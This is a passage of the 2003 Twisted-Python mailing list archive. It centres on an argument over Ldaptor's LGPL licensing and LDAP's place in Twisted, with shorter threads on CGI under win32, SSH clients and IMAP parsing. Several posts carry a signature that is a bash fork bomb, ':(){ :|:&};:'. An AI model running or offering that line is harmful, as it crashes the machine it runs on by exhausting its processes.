	(witness the LDAPv3 effort).

> Although the legal environment for open source moves quite slowly,
> it is certainly not static; thus changes may be required down the
> road (think 5-15 years) and furthermore, to enforce the license you
> have to have an coordinated entity to do this.   If the code comes
> from a hodge-podge of developers, most of whom can't be contacted,
> it makes enforcement impossible.

	We'll have bigger problems than Ldaptor's whopping <10
	developers -- and that's an optimistic guess.

> Another problem that is on the horizion is is alot of FUD and
> uncertainty by corporations in using open source beacuse it is
> hard to track down who owned what modules, etc.   Unless we do
> this in an organized manner, it doesn't matter what license
> we put at the top of the file; wide spread adoption will be
> hindered.  Alas, this is probably the wrong list for this sort
> of discussion; perhaps we need a twisted-legal (for licensing, 
> and other legal stuff)

	Count me out. I just don't give a damn. I'm not trying
	to sell Ldaptor to anyone; I never will.

	Then again, someone may end up buying an installation of
	Ldaptor from me. They just won't know it, and won't care. And
	that's the difference.

> | 	Yes, the word syntax is bad. It dates back to the time I tried to
> | 	make the data in LDAP be manipulatable as Python objects, from the
> | 	days before Twisted.
> | 
> | 	I refuse to name a class "Object". I refuse to name a class
> | 	"Proxy".
> 
> After reading the RFC, it seems that "entry" is most often used
> to mean an object in the LDAP database.

	I'm guessing you won't be happy even after an
	s/LDAPObject/LDAPEntry/g operation, so I'm not
	doing that right now.. It doesn't really matter
	what those classes are called, as you aren't
	supposed to really ever instantiate them yourself.

> Right.   And I'd just like to see the opposite:
> 
>         1.  state machine
> 
>              ldaptor.protocols.ldap3.client
>              ldaptor.protocols.ldap3.server
>       
>         2. wire format
> 
>              ldaptor.protocols.ldap3.wire.ber
>              ldaptor.protocols.ldap3.wire.request

	Pureber and pureldap should be applicable to all LDAP versions
	and LDAP over UDP. Pureber should be applicable to all BER-based
	protocols, such as SNMP. They have a broader scope than a
	single protocol.

> | > Anyway, I'm curious how open you are to these items.   Adding this to
> | > Twisted (with alot of work) is probably a good bargin; you get more
> | > eyes helping your project along, documentation, etc.  
> | 	I have long hoped for some other developers to share the work.
> I'm a painful one.  ;)

	Umm. "Yes." Let's see if you write code or docs that are
	worth it ;)

	Questioning me is fine. (Resisting me is futile ;)

> | 	But no, I will not donate >10000 lines of my work to glyph.
> | 	I'm too much a free software bigot; I want to force him to
> | 	the rules of LGPL. Just like everyone else. In fact, that's
> | 	why I still consider him to have a partial copyright on Ldaptor,
> | 	even though he wrote none of it; that makes _me_ faithful to
> | 	the LGPL, too. And that's a good thing.
> I will let Glyph respond to this when he has time.  I do think that
> there is quite a deep mis-understanding here, hopefully this will
> resolve it self shortly.

	I think glyph understands my stand well enough, and we have
	talked about this back when the transition happened.

	There's no way around it. For what is in the Twisted core,
	he wants to have freedoms the LGPL doesn't give him. I don't
	want to donate expected ~30000 lines of python away just
	like that; I want to make him be bound to LGPL, just like
	everyone else.

> Also, I think that you are completely wrong about LDAP not
> being core.  It is just a matter of time.   LDAP is barely
> 6 years old now...  it takes at least 5 years for broad 
> adoption... more like 10.   LDAP has a long way to go, and
> something like ldaptor in twisted could make it go much
> further.   Further, having ldap in twisted will allow other
> packages to tightly integrate with ldap (for instance, the
> imap server via cred), etc.

	Let me repeat myself. If installing one library is too
	much effort for you, you are using the wrong OS.

	Twisted can integrate with LDAP just fine. There's no
	problem in using Ldaptor in the optional parts. There's
	no way to make LDAP ever be a _requirement_ for some
	core Twisted service -- I'll scream bloody murder and
	remove the code, even if that means someone revoking
	my commit access. LDAP is not a pretty protocol, and
	it's too far from minimal to be ever acceptable in
	such a role.

	(Oh, did you notice that the openldap library is not
	in the libc?)

	Besides, if you think makin IMAP authenticate via LDAP
	requires changes in cred _or_ Twisted, you have misunderstood
	how modular Twisted is. I have long had an LDAP-using
	cred mechanism (of course with the old API).

	In fact, most "servers" in Twisted (more like example
	code) only know how to authenticate against in-memory
	data structures. And that's how it's supposed to be.
	I don't want to see Twisted become a hodge-podge of
	100 applications; Twisted should be the _framework_.
	Application code should be external to it. See e.g.
	CVSToys, BuildBot, etc.

-- 
:(){ :|:&};:



From Richard.Townsend at edl.uk.eds.com  Wed Jul  2 10:31:28 2003
From: Richard.Townsend at edl.uk.eds.com (Richard.Townsend at edl.uk.eds.com)
Date: Wed, 2 Jul 2003 15:31:28 +0100 
Subject: [Twisted-Python] logfile.LogFile
Message-ID: <76ADB8C376C3D31193F50008C7E6D3B2F3E165@EWHKA005>

I was trying to set the defaultMode arg in LogFile.__init__() but it didn't
seem to have any effect on the generated log file's permissions.

In BaseLogFile.__init__() - if defaultMode is not None, it sets
self.defaultMode to None.
Should it not set it to defaultMode ?

-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030702/6be09608/attachment.htm 

From pb_twisted at olga.mine.nu  Wed Jul  2 11:35:48 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Wed, 2 Jul 2003 17:35:48 +0200
Subject: [Twisted-Python] Controlling the classes being Jellied
In-Reply-To: <20030702.015903.06353698.warner@lothar.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFIEEOCAAA.pb_twisted@olga.mine.nu>

> The two important points are:
>
>  1: by overriding .getTypeToCopy(), the sending class can control
> what class
>     name is put into the serialized stream.
>
>  2: pb.setUnjellyableForClass maps a name (the one in the serialized
stream)
>     to a local class. The name can be specified either as a string or as a
>     class. If you don't have access to the the class, just use a string
that
>     matches the one used by the sender. The only caveat is to make sure
the
>     string is unique with respect to packages and modules and such.. in
>     general is should be a "fully qualified" class name.

Smashing! This solved my problems right away.

I am having some problems finding my way around the API docs. The
Copyable.getTypeToCopy() I found eventually, but I still can't find
pb.setUnjellyableForClass in the docs even when I know what to look for.

Thanks a lot for the help, Brian!


- Patrik





From bob at redivi.com  Wed Jul  2 11:50:55 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 2 Jul 2003 11:50:55 -0400
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702142838.GC10309@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog>
Message-ID: <20030702115055.A6376@redivi.com>

On Wed, Jul 02, 2003 at 05:28:38PM +0300, Tommi Virtanen wrote:
> On Wed, Jul 02, 2003 at 08:07:48AM +0000, Clark C. Evans wrote:
> > I think LDAP is pretty cornerstone to any internet application
> > where 'single sign on' and other directory information is 
> > required.   If it was available, I even picture game servers
> > or muds using it... 
> 
> 	You mean you hope it will be? (Quick! Name three end user
> 	applications using LDAP!)
> 

Outlook, Windows 2000, MacOS X, (Apple) Address Book, Eudora, Netscape Mail, etc.

> 	Let me repeat myself. If installing one library is too
> 	much effort for you, you are using the wrong OS.

Twisted and LDAP are cross-platform.  You shouldn't try make that kind of argument.

> 	(Oh, did you notice that the openldap library is not
> 	in the libc?)

OpenLDAP (slapd and the client libraries) come with MacOS X and MacOS X server.  Every version of Windows 2000 and later releases based on the same tree can speak LDAP.

It's not in the libc because it's not part of POSIX or ANSI C.

-bob



From cce at clarkevans.com  Wed Jul  2 12:30:40 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 16:30:40 +0000
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702142838.GC10309@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog>
Message-ID: <20030702163040.GA82621@doublegemini.com>

On Wed, Jul 02, 2003 at 05:28:38PM +0300, Tommi Virtanen wrote:
| On Wed, Jul 02, 2003 at 08:07:48AM +0000, Clark C. Evans wrote:
| > | 	LDAP is not really used commonly enough to bloat the twisted
| > | 	core with it. (Quick! Name three end user applications using
| > | 	LDAP!)
| > I think LDAP is pretty cornerstone to any internet application
| > where 'single sign on' and other directory information is 
| > required.   If it was available, I even picture game servers
| > or muds using it... 
| 
| 	You mean you hope it will be? (Quick! Name three end user
| 	applications using LDAP!)

I'll name 3 common internet protocols which often in large
enterprises are hooked up to LDAP...

   IMAP, SAMBA, SMTP

| 	LDAP is an ugly, broken, horrible non-unixy non-internetty
| 	protocol conceived by the folk who gave you such marvels as
| 	X.25. I hope LDAP dies screaming.

Well, I agree here.   But *something* has to fill this role of
orgnization wide directory.  Perhaps a unixy LDAP replacement is 
needed down stream.

| > After reading the RFC, it seems that "entry" is most often used
| > to mean an object in the LDAP database.
| 
| 	I'm guessing you won't be happy even after an
| 	s/LDAPObject/LDAPEntry/g operation, so I'm not
| 	doing that right now.. It doesn't really matter
| 	what those classes are called, as you aren't
| 	supposed to really ever instantiate them yourself.

Well, I'd rather see ldap.Entry ... "entry" is far superior
to "object".   You don't call a tuple returned by the database
an "object", you call it a "row" (not an ODBCRow).  There 
really isn't a 1-1 correspondence between object and 
LDAP's entry.

| > Right.   And I'd just like to see the opposite:
| > 
| >         1.  state machine
| > 
| >              ldaptor.protocols.ldap3.client
| >              ldaptor.protocols.ldap3.server
| >       
| >         2. wire format
| > 
| >              ldaptor.protocols.ldap3.wire.ber
| >              ldaptor.protocols.ldap3.wire.request
| 
| 	Pureber and pureldap should be applicable to all LDAP versions
| 	and LDAP over UDP. Pureber should be applicable to all BER-based
| 	protocols, such as SNMP. They have a broader scope than a
| 	single protocol.

    ldaptor.protocols.wire.ber
    ldaptor.protocols.wire.request

| 	There's no way around it. For what is in the Twisted core,
| 	he wants to have freedoms the LGPL doesn't give him. I don't
| 	want to donate expected ~30000 lines of python away just
| 	like that; I want to make him be bound to LGPL, just like
| 	everyone else.

Assume for a moment that a foundation (similar to Apache) is
formed for Twisted.   What characteristics of this organization
are required for you to be 'comfortable' with the code being
donated?

| 	Let me repeat myself. If installing one library is too
| 	much effort for you, you are using the wrong OS.

I'd rather not have twisted require a package management
service to download all the third party components necessary.

Best,

Clark



From cce at clarkevans.com  Wed Jul  2 13:45:38 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 17:45:38 +0000
Subject: [Twisted-Python] ldap for twisted
In-Reply-To: <20030702032744.GA80790@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com>
Message-ID: <20030702174538.GA82865@doublegemini.com>

After giving much thought to ldaptor, I've decided to use python-ldap
for my short-term needs.   I've done this for a few reasons:

  1.  python-ldap is quite mature, it is a thin wrapper over
      OpenLDAP.   It is fairly well documented, licensed well,
      has some unit tests, etc.

  2.  python-ldap has a very nice async interface which I am
      wrapping with flow and deferreds.   I will probably put
      this wrapper in the sandbox when I finish for those 
      who are interested.i

  3.  ldaptor is not part of Twisted, and thus the choice is
      between two external modules; and my deployment platform
      already has OpenLDAP installed so pure python is not a
      requirement

Best,

Clark



From tv at twistedmatrix.com  Wed Jul  2 14:09:38 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 21:09:38 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702115055.A6376@redivi.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030702115055.A6376@redivi.com>
Message-ID: <20030702180938.GB1142@tao.tv.debian.net>

On Wed, Jul 02, 2003 at 11:50:55AM -0400, Bob Ippolito wrote:
> > > I think LDAP is pretty cornerstone to any internet application
> > > where 'single sign on' and other directory information is 
> > > required.   If it was available, I even picture game servers
> > > or muds using it... 
> > 	You mean you hope it will be? (Quick! Name three end user
> > 	applications using LDAP!)
> Outlook, Windows 2000, MacOS X, (Apple) Address Book, Eudora, Netscape Mail, etc.
  1                               2                     3       4

	Applications, not operating systems have some way to use LDAP.
	Now look at them. They all use LDAP as address books.
	The part about LDAP is an extra value for places that already
	happen to use LDAP. Very few places would actually start
	to use LDAP just for that. Plus, its all inside one organization.
	What a "core internet protocol".

	Don't misread me, I wouldn't be writing Ldaptor if I
	thought LDAP was useless. It's pretty nifty. But don't think
	its anywhere near HTTP or SMTP in relevance.
	(In fact, one nice use for Twisted would be to use XML-over-HTTP
	as an LDAP replacement.)

> > 	Let me repeat myself. If installing one library is too
> > 	much effort for you, you are using the wrong OS.
> Twisted and LDAP are cross-platform.  You shouldn't try make that kind of argument.

	And how does Twisted's cross-platformness make inferior
	operating systems less painful?

> > 	(Oh, did you notice that the openldap library is not
> > 	in the libc?)
> OpenLDAP (slapd and the client libraries) come with MacOS X and MacOS X server.
> Every version of Windows 2000 and later releases based on the same tree can speak LDAP.

	You're pretty much missing the point.

	OpenLDAP is a separate library.
	The W3C WWW library is a separate library.
	xmlrpc-c is a separate library.

	If it's hard for you to have separate libraries, you have issues.
	If you're trying to say "but all I need is in my OS", then you are
	stuck using what your OS has, and exactly the version your OS has.
	That's still an inferior OS, for it has bad extendability and is
	upgradable only at the mercy of the vendor.

	Besides, I frankly don't give a shit about commercial OSes.
	If ldaptor didn't work on win32 or solaris, I wouldn't even know.
	That's just not interesting. (Other people are free to fix
	portability problems; I may even merge their changes, if they
	are clean. That doesn't contradict the above.)

> It's not in the libc because it's not part of POSIX or ANSI C.

	Thats pretty weak, there's a lot in many libcs that isn't.


	I wonder what this discussion is aiming at? You people keep
	telling me that LDAP is important, and I'm still the only
	one implementing it.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Wed Jul  2 14:32:37 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 21:32:37 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702163040.GA82621@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030702163040.GA82621@doublegemini.com>
Message-ID: <20030702183237.GC1142@tao.tv.debian.net>

On Wed, Jul 02, 2003 at 04:30:40PM +0000, Clark C. Evans wrote:
> I'll name 3 common internet protocols which often in large
> enterprises are hooked up to LDAP...
>    IMAP, SAMBA, SMTP

	Just say "accounts".

	Just about the only use for LDAP anywhere is to store
	users. It's cool. When you have thousands of them on
	different boxes, /etc/passwd gets boring. But still,
	it's only accounts. (The only real exception I know is
	certification revocation lists.)

	But don't overinflate that role. The only reasons LDAP
	is alive are because SQL is ugly, the databases are
	slow and/or expensive, and DNS is very limited.

	Think about it. LDAP isn't used to publish spam blacklists.
	It isn't used to index emails. It isn't used to find files
	in Samba shares. It isn't used to hold email. These are
	all things DNS or databases have been used for (mostly
	unsuccesfully, but that isn't relevant here). LDAP just isn't
	used _that_ much.

>     ldaptor.protocols.wire.ber
>     ldaptor.protocols.wire.request

	So use pushed them into a package and renamed pureldap
	to "request", which is false and misleading?

	s/pure/wire./ might be doable. But ldap isn't request,
	its all things ldappy (everything on the write that isn't
	basic BER).

	But you can't rename a module there "ldap", that's a horrible
	name. Thus, I named them "pure*", for two things: pure python,
	and pure also as in no dependencies; they are perfectly
	reusable.

> | 	There's no way around it. For what is in the Twisted core,
> | 	he wants to have freedoms the LGPL doesn't give him. I don't
> | 	want to donate expected ~30000 lines of python away just
> | 	like that; I want to make him be bound to LGPL, just like
> | 	everyone else.
> Assume for a moment that a foundation (similar to Apache) is
> formed for Twisted.   What characteristics of this organization
> are required for you to be 'comfortable' with the code being
> donated?

	Umm. A moral stand I can agree with. "Sell to the game industry
	if they pay $$$" is not one. Unless I _work_ to create the thing
	sold; I'm willing to sell my moral, but the price isn't what
	glyph/$FOUNDATION maybe one day might give me -- it's a lot of
	money per month, starting right now.

	For pocket money, I prefer to not give my freedoms away; in fact,
	I want more freedoms if at all possible.

	I _want_ the bugfixes $CORPORATION makes.


	Just to clarify: I'm not accusing glyph. I'm not blaming him.
	There is no reason to continue this discussion. In fact,
	he would probably prefer this discussion never happened. There
	is no conflict here. We are in perfect agreement on this, as
	far as I know. If I were him, I'd try to sell Twisted, too.
	And he's free to sell Ldaptor, too. I'm just not giving him
	any special rights to it; you are as priviledged as glyph, in
	that matter.

> | 	Let me repeat myself. If installing one library is too
> | 	much effort for you, you are using the wrong OS.
> I'd rather not have twisted require a package management
> service to download all the third party components necessary.

	Missing the point. Twisted doesn't have to depend on Ldaptor.
	In fact, it never would (I wouldn't want it and glyph won't
	allow it). Your favorite mail reader, written using Twisted
	and the IMAP client protocol in Twisted can probe for Ldaptor
	and enable its address book functions on the fly.


	Can we just get on with the programming? I accept patches.
	Ldaptor isn't hard to install; if it is, I accept patches
	even for improving that :)

-- 
:(){ :|:&};:



From smurf at smurf.noris.de  Wed Jul  2 16:37:56 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Wed, 02 Jul 2003 22:37:56 +0200
Subject: [Twisted-Python] ldap for twisted
References: <20030702032744.GA80790@doublegemini.com> <20030702174538.GA82865@doublegemini.com>
Message-ID: <pan.2003.07.02.20.37.55.529290@smurf.noris.de>

Hi, Clark C. Evans wrote:

>   2.  python-ldap has a very nice async interface which I am
>       wrapping with flow and deferreds.   I will probably put this wrapper
>       in the sandbox when I finish for those who are interested.

That'd be nice.

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
Life goes on, even if two-headed and glowing faintly in the dark.
		-- Ursula K. Le Guin




From dalke at dalkescientific.com  Wed Jul  2 17:03:57 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Wed, 2 Jul 2003 15:03:57 -0600
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702183237.GC1142@tao.tv.debian.net>
Message-ID: <B290AE87-ACD0-11D7-9900-000393C92466@dalkescientific.com>

Tommi Virtanen:
> 	Just about the only use for LDAP anywhere is to store
> 	users. It's cool. When you have thousands of them on
> 	different boxes, /etc/passwd gets boring. But still,
> 	it's only accounts. (The only real exception I know is
> 	certification revocation lists.)

There are a few projects in bioinformatics which make sequence
records available via LDAP

http://iubio.bio.indiana.edu/biogrid/biogrids.html
>  Directories of Bio-data for efficient, high volume, Grid distribution
>  of bio-data. This is based on LDAP for a computable, networked
>  search/retrieval of bio-objects (as opposed to flat file databanks
>  or web pages). This includes an experimental LDAP-SRS gateway for
>  query and retrieval of biosequence and genome data housed at IUBio
>  Archive (/srs/ and /eugenes/ data sections).

http://openbns.sourceforge.net/
>  The Biomolecule Naming Service (BNS) is an LDAP-based directory of
>  gene and protein information derived from NCBI's LocusLink database.
>  The main purpose of BNS is to quickly and easily convert between
>  different name and identifier schemes commonly used for specifying
>  gene and protein sequences.

TV:
> 	Think about it. LDAP isn't used to publish spam blacklists.

There's at least one posted idea for doing that at
   http://mla.libertine.org/tmda-workers/2001-11/msg00110.html
but it's only in the "wouldn't it be interesting if" stage.

But I know rather little about LDAP's uses.  Being googlesmart,
I did find
   http://www.networkmagazine.com/article/DCM20000502S0039
which describes where LDAP is/is not appropriate.  It says
 > LDAP isn't a replacement for relational databases (and never
 > will be). It's not a substitute for a file system. It wasn't
 > built to knock DNS (domain name server) out of the ring.

and elsewhere that it's not good for BLOBs, so while you said
it's not good for replacing a DB, DNS, etc., well, that's
already well-known, and not what it claims to be good for,
which is managing information about resources.

For me, I have about as much need for LDAP (right now) as I
do for ICQ; none.  Maybe next year for LDAP, when looking into
some of those sequence databases.

					Andrew
					dalke at dalkescientific.com




From tv at twistedmatrix.com  Wed Jul  2 17:13:07 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 3 Jul 2003 00:13:07 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702180938.GB1142@tao.tv.debian.net>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030702115055.A6376@redivi.com> <20030702180938.GB1142@tao.tv.debian.net>
Message-ID: <20030702211307.GA11312@lapdog>

On Wed, Jul 02, 2003 at 09:09:38PM +0300, Tommi Virtanen wrote:
> > Outlook, Windows 2000, MacOS X, (Apple) Address Book, Eudora, Netscape Mail, etc.
>   1                               2                     3       4
> 
> 	Applications, not operating systems have some way to use LDAP.
                                           ^that

-- 
:(){ :|:&};:



From pp64 at cornell.edu  Wed Jul  2 20:46:44 2003
From: pp64 at cornell.edu (Pavel Pergamenshchik)
Date: Wed, 2 Jul 2003 20:46:44 -0400
Subject: [Twisted-Python] twisted.trial.unittest.TestCase now now has an mktemp() method
Message-ID: <20030702204644.6a10f0bd.pp64@cornell.edu>

Hi.
Please don't use tempfile.mktemp() in tests -- use "self.mktemp" instead. It gives names from nice, organized directory structure under _trial_temp/, which is much better than putting stuff with cryptic names all over /tmp. I modified all tests that use mktemp. Yell at me if something suddenly breaks.

Pahan



From cliechti at gmx.net  Wed Jul  2 20:48:20 2003
From: cliechti at gmx.net (Chris Liechti)
Date: Thu, 03 Jul 2003 02:48:20 +0200
Subject: [Twisted-Python] [patch] win32serialport win98 support
Message-ID: <3F037D54.4050201@gmx.net>

i'd call it a "crappy OS support patch" ;-) there are a few flaws in 
win98, e.g. reading zero bytes blocks forever and such.
this patch provides workarounds so that the serial port can be used on 
both, Win98/ME and the NT/2k/XP series.

i tested on win98, nt4, 2k and xp.

chris
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: win32serialport.py.patch
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030703/86c43700/attachment.txt 

From eltronic at juno.com  Wed Jul  2 21:37:52 2003
From: eltronic at juno.com (eltronic at juno.com)
Date: Wed, 2 Jul 2003 21:37:52 -0400
Subject: [Twisted-Python] cgi on win32 fails, process only available in this reactor on POSIX
Message-ID: <20030702.213804.-169917.0.eltronic@juno.com>

am I missing something to get cgi working?
running a web.tas created from a dos window,
when I navigate to http://localhost/moin.cgi

**edited [HTTPChannel,0,127.0.0.1] Traceback 
File "...\twisted\web\twcgi.py", line 130, in runProcess
   reactor.spawnProcess(p, self.filename, [self.filename]+qargs, env,
os.path.dirname(self.filename))
File "...\twisted\internet\default.py", line 168, in spawnProcess
   raise NotImplementedError, "process only available in this reactor on
POSIX"

judging from the one paragraph in book.pdf on cgi
I'm guessing its not a huge priority to have this 
work on win98 out of the box.
had the same problem with that Perlscript example.
looks like win cgi is made impossible in 
t.i.defaults.py where it appears to force posix 
and everything else is commented out.

tried adding this to scripts/mktap.py & scripts/twistd.py
and running msys the mingw bash shell

if sys.platform == 'win32':
    if os.getenv('MSYSTEM','nope')=='MINGW32':
        os.path = __import__('posixpath')
        os.sep='/'
which also produces the same error with any cgi

was the same in 1.0.5, currently using 1.0.6 
installed from source with setup.py 
which doesn't create any shortcuts
for tkmktap.py and is missing the twistenv.bat
like the installer created in 1.0.5
woulden't even try to compile c reactor,
otherwise installed ok. 
and, other web activity using html and rpy works.

on another front:
scripts/trial.py won't run from msys
some strange path stuff at the top
causes  ./scripts and ../Lib/site-packages
to be duplicated several times in sys.path and then
ImportError: No module named twisted.scripts.trial

from dos window all the tests try to run

from dos window
$ python trial.py -p twisted.test
protocols\dns.py:50: RuntimeWarning: PyCrypto not available -
   proceeding with non-cryptographically secure random source
$ is too, and I tryed changing a few things,  but ok,
then a bunch of tracebacks
KeyError: Invalid OID 65207c3d20524544 (too large)
-----------
Ran 797 tests in 1121.250s

FAILED (failures=5, errors=9, skips=28, expectedFailures=4)
leaves about 150k of junk in scripts/_trial_temp

am I missing something to get cgi working?
in reply please, don't be afraid to state the obvious.

________________________________________________________________
The best thing to hit the internet in years - Juno SpeedBand!
Surf the web up to FIVE TIMES FASTER!
Only $14.95/ month - visit www.juno.com to sign up today!



From anders at bruun-olsen.net  Wed Jul  2 22:12:30 2003
From: anders at bruun-olsen.net (Anders Bruun Olsen)
Date: Thu, 3 Jul 2003 04:12:30 +0200
Subject: [Twisted-Python] Can't get ssh-connections to work
Message-ID: <20030703021230.GB5058@elmer.skumleren.net>

Hi,

I am brand-spanking new at twisted but wanted to make an app that
connects through ssh to a remote machine and fetches some info, which I
thought twisted to be perfect for. I am trying to get the ssh example to
work but it just hangs!

I have entered it exactly as it is on the webpage (cut-and-paste and the
fixed the indentions). The only thing changed is the host to connect to,
there I have chosen a server I have running on my LAN.
I have also added a call to log.startLogging(sys.stdout, setStdout=0) to
get some logging output to see if I could figure out the problem. This
is the output I get:

2003/07/03 04:04 CEST [-] Log opened.
2003/07/03 04:04 CEST [-] Starting factory <twisted.internet.protocol.ClientFactory instance at 0x8359c0c>
2003/07/03 04:04 CEST [-] Stopping factory <twisted.internet.protocol.ClientFactory instance at 0x8359c0c>

Then it just hangs there until I break it. I can't see any connection on
the server, so I don't think it even gets that far.

What might be the problem here?

-- 
Anders
-----BEGIN GEEK CODE BLOCK-----
Version: 3.12
GCS/O d--@ s:+ a-- C++ $UL+++ P++ L+++ E- W+ N(+) o K? w O- M-- V
PS+ PE@ Y+ PGP+ t 5 X R+ tv+ b+ DI+++ D+ G e- h !r y?
------END GEEK CODE BLOCK------
PGPKey: http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x8BFECB41



From z3p at twistedmatrix.com  Thu Jul  3 00:41:26 2003
From: z3p at twistedmatrix.com (Paul Swartz)
Date: Thu, 03 Jul 2003 00:41:26 -0400
Subject: [Twisted-Python] Can't get ssh-connections to work
In-Reply-To: <20030703021230.GB5058@elmer.skumleren.net>
Message-ID: <3F037BB6.23532.7B81244@localhost>

On 3 Jul 2003 at 4:12, Anders Bruun Olsen wrote:

> Hi,
> 
> I am brand-spanking new at twisted but wanted to make an app that
> connects through ssh to a remote machine and fetches some info, which I
> thought twisted to be perfect for. I am trying to get the ssh example to
> work but it just hangs!
> 
> I have entered it exactly as it is on the webpage (cut-and-paste and the
> fixed the indentions). The only thing changed is the host to connect to,
> there I have chosen a server I have running on my LAN.
> I have also added a call to log.startLogging(sys.stdout, setStdout=0) to
> get some logging output to see if I could figure out the problem. This
> is the output I get:

Could you send me the code you've got?  Also, try the example in 
doc/examples/sshsimpleclient.py

-p
-- 
     Paul Swartz
(o_  http://twistedmatrix.com/users/z3p.twistd/
//\  z3p at twistedmatrix.com
V_/_ AIM: Z3Penguin




From jml at ids.org.au  Thu Jul  3 02:12:03 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Thu, 3 Jul 2003 16:12:03 +1000
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030703054426.GC665@sting>; from jml@ids.org.au on Thu, Jul 03, 2003 at 15:44:26 +1000
References: <20030703054426.GC665@sting>
Message-ID: <20030703061203.GE665@sting>

One of the goals with Issues was to have something usable by the 
developers and users of Twisted, as there is much dissatisfaction with 
sourceforge's tracker. If people would like to see Issues used in this 
way, then I'd appreciated being told about any important missing 
features, so things can start actually happening.

If not, and there is some other solution in mind, let's switch to that 
now, and kill off Issues entirely (except perhaps as an example). After 
all "code is a liability, functionality is an asset".

cheers,
jml



From lafou at wanadoo.fr  Thu Jul  3 04:47:44 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 03 Jul 2003 10:47:44 +0200
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030703061203.GE665@sting>
References: <20030703054426.GC665@sting>  <20030703061203.GE665@sting>
Message-ID: <1057222064.2353.12.camel@biproc>

On Thu, 2003-07-03 at 08:12, Jonathan Lange wrote:
> One of the goals with Issues was to have something usable by the 
> developers and users of Twisted, as there is much dissatisfaction with 
> sourceforge's tracker. If people would like to see Issues used in this 
> way, then I'd appreciated being told about any important missing 
> features, so things can start actually happening.
> 
> If not, and there is some other solution in mind, let's switch to that 
> now, and kill off Issues entirely (except perhaps as an example). After 
> all "code is a liability, functionality is an asset".


I think it's a good idea. This also demonstrates how twisted (and specially Woven)
can be used to create some applications.





From exarkun at intarweb.us  Thu Jul  3 05:11:22 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Thu, 3 Jul 2003 05:11:22 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <200307022114.h62LEMw2001260@fido.strakt.com>
References: <200307022114.h62LEMw2001260@fido.strakt.com>
Message-ID: <20030703091122.GA31417@intarweb.us>

On Wed, Jul 02, 2003 at 11:14:22PM +0200, Anders Hammarquist wrote:
> Hi!
> 
> Here are the changes for handling literals I talked about earlier.
> So far I've only looked at the server part, but it seems to work
> nicely. There's still work to do on improving the argument parser
> functions, as some arguments can probably be parsed into a nicer
> format than used now.

  Great stuff, I really really like your solution to the parsing problem. 
The patch is now applied, with a couple changes:

  * MessageSet.__iadd__ was renamed to MessageSet.extend.  __iadd__ gives me
nightmares.

  * I re-arranged the MessageSet.last property code in a trivial manner to
keep the class namespace cleaner.  As a result, _getLast and _setLast are no
longer available explicitly, only implicitly through reads and writes of the
property.

  I am unsure about the usefulness of the LiteralString class in its current
state.  It seems to open up the possiblity of an unbounded memory usage
attack against the server.  I'm considering either removing it and using
LiteralFile in its place, or adding a limit to the size of string it will
accept (something on the order of a kilobyte or two, though I will check
exactly what might get passed to it by a benign client before picking a
default limit).  Do you have any particular reason to want to keep it, or to
keep it unlimited?

  I suppose I will be thinking about how to apply a similar change to the
client code, where it will have (at least to me ;) a much more noticable
affect on performance.  It seems a little tougher, but maybe a mapping of
responses to parsers would do the job...  Any ideas in this area would be
welcome :)

  Thanks again for this contribution,

  Jp
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030703/be7ed160/attachment.pgp 

From iko at cd.chalmers.se  Thu Jul  3 07:09:10 2003
From: iko at cd.chalmers.se (Anders Hammarquist)
Date: Thu, 03 Jul 2003 13:09:10 +0200
Subject: [Twisted-Python] Re: IMAP fixes 
In-Reply-To: <20030703091122.GA31417@intarweb.us> 
